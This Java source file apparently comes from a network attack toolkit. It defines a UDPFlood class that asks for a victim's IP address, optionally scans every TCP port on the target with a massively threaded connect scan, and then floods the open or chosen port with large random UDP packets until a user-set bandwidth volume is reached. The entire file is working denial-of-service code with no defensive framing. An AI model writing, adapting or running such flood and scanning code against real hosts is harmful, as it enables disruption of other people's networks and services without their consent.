package attack;

import utils.LoggingUtils;
import utils.ProgressBarUtils;

import java.io.IOException;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class UDPFlood extends LoggingUtils {

    public UDPFlood() throws IOException {
        final InetAddress address = InetAddress.getByName(getUserInput("Enter victim's IPv4 address: "));

        final Integer port = Integer.parseInt(getUserInput("Enter specific port to attack ('0' will result in automatic port scan): "));

        List<Integer> dynamicPorts = new ArrayList<>();

        if (port == 0) {

            log("scanning open ports on victim...");

            dynamicPorts = checkAllPorts(address.getHostAddress(), false);

            log("open ports: " + dynamicPorts);

            if (dynamicPorts == null || dynamicPorts.isEmpty()) {
                dynamicPorts = new ArrayList<>();
                dynamicPorts.add(1);
            }
        }

        log("building 500kB byte array...");

        byte[] b = new byte[61100]; // 500 Kbps
        new Random().nextBytes(b);

        log("creating socket...");

        final DatagramSocket socket = new DatagramSocket();

        final int mbpsCount = Integer.parseInt(getUserInput("Enter attack size (in Mbps): "));

        log("adjusting mbps count...");

        final long startTime = System.currentTimeMillis();

        log("timer started, sending packets. please wait...");

        log("starting progress bar util...");

        info("Sending " + mbpsCount + "mbps over " + address.getHostAddress() + ", please wait...");

        for (int i = 0; i < (mbpsCount * 2); i++) {


            ProgressBarUtils.printProgress(startTime, (mbpsCount * 2L), i);

            final DatagramPacket packet
                    = new DatagramPacket(b, b.length, address, !dynamicPorts.isEmpty() ? getRandomElement(dynamicPorts) : port);

            socket.send(packet);
        }

        log("every packet was sent over.                                                                                                               ");

        exitSuccess("Done! | Sent " + mbpsCount + " Mbits | To " + address.getHostAddress() + " | In " + String.format("%d min %d sec",
                TimeUnit.MILLISECONDS.toMinutes(System.currentTimeMillis() - startTime),
                TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis() - startTime) -
                        TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(System.currentTimeMillis() - startTime))
        ) + " (" + (System.currentTimeMillis() - startTime) + " ms)");
    }

    public static ArrayList<Integer> checkAllPorts(final String ipv4, final boolean reverse) {

        // Here reverse tells if we should return open ports (false) or closed ports (true).

        final ExecutorService executorService = Executors.newFixedThreadPool(65535);
        final ArrayList<CompletableFuture<Void>> futures = new ArrayList<>();

        // List of open ports we will return at the end
        final ArrayList<Integer> returnPorts = new ArrayList<>();

        for (int i = 0; i <= 65535; i++) {

            int finalI = i;

            final CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {

                try {
                    new Socket().connect(new InetSocketAddress(ipv4, finalI), 1000);
                    if (!reverse) returnPorts.add(finalI);
                } catch (final IOException ignored) {
                    if (reverse) returnPorts.add(finalI);
                }
            }, executorService);
            futures.add(future);
        }
        CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
        executorService.shutdownNow();

        if (returnPorts.isEmpty()) return null;

        return returnPorts;
    }

    public Integer getRandomElement(final List<Integer> list) {
        return list.get(new Random().nextInt(list.size()));
    }
}
